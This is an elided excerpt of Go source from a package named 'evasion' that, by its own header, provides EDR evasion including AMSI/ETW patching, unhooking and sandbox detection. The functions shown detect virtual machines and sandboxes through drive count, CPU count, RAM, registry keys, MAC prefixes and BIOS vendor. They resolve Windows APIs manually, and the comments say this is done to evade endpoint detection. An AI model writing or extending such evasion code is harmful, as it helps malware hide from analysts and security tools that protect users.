...
// Package evasion provides EDR evasion techniques including
// AMSI/ETW patching, unhooking, and sandbox detection.
package evasion
...
func checkDriveCount() bool {
	...
	// Use manual API resolution instead of LazyDLL for better EDR evasion
	procGetLogicalDriveStrings, err := core.ManualGetProcAddress("kernel32.dll", "GetLogicalDriveStringsW")
	if err != nil {
		return false // Error occurred, default to not sandbox
	}

	ret, _, _ := syscall.Syscall(
		procGetLogicalDriveStrings,
		2,
		uintptr(drivesLen),
...
func checkCPUCount() bool {
	// Use manual API resolution instead of LazyDLL for better EDR evasion
	procGetSystemInfo, err := core.ManualGetProcAddress("kernel32.dll", "GetSystemInfo")
	if err != nil {
		// Fallback to default behavior if API resolution fails
		return false
	}
...
func checkRAMSize() bool {
	// Use manual API resolution instead of LazyDLL for better EDR evasion
	procGetPhysicallyInstalledSystemMemory, err := core.ManualGetProcAddress("kernel32.dll", "GetPhysicallyInstalledSystemMemory")
	if err != nil {
...
func checkRAMWithGlobalMemoryStatus() bool {
	// Use manual API resolution instead of LazyDLL for better EDR evasion
	procGetGlobalMemoryStatusEx, err := core.ManualGetProcAddress("kernel32.dll", "GetGlobalMemoryStatusEx")
	if err != nil {
...
func checkSandboxRegistry() bool {
	// Use manual API resolution instead of LazyDLL for better EDR evasion
	procRegOpenKeyEx, err1 := core.ManualGetProcAddress("advapi32.dll", "RegOpenKeyExW")
	procRegCloseKey, err2 := core.ManualGetProcAddress("advapi32.dll", "RegCloseKey")
	if err1 != nil || err2 != nil {
		return false // Error occurred during API resolution
	}
	...
	if ret == 0 {
		...
		syscall.Syscall(procRegCloseKey, 1, hKey, 0, 0)
		return true
	}
...
func checkVirtualizedMAC() bool {
	...
	// Use manual API resolution instead of LazyDLL for better EDR evasion
	procGetAdaptersInfo, err := core.ManualGetProcAddress("iphlpapi.dll", "GetAdaptersInfo")
	if err != nil {
		return false // Error occurred during API resolution
	}
...
func checkBIOSVendor() bool {
	// Use manual API resolution instead of LazyDLL for better EDR evasion
	procRegOpenKeyEx, err1 := core.ManualGetProcAddress("advapi32.dll", "RegOpenKeyExW")
	procRegQueryValueEx, err2 := core.ManualGetProcAddress("advapi32.dll", "RegQueryValueExW")
	procRegCloseKey, err3 := core.ManualGetProcAddress("advapi32.dll", "RegCloseKey")
	...
	if ret != 0 {
		syscall.Syscall(procRegCloseKey, 1, hKey, 0, 0) // Clean up before returning
		return false
	}
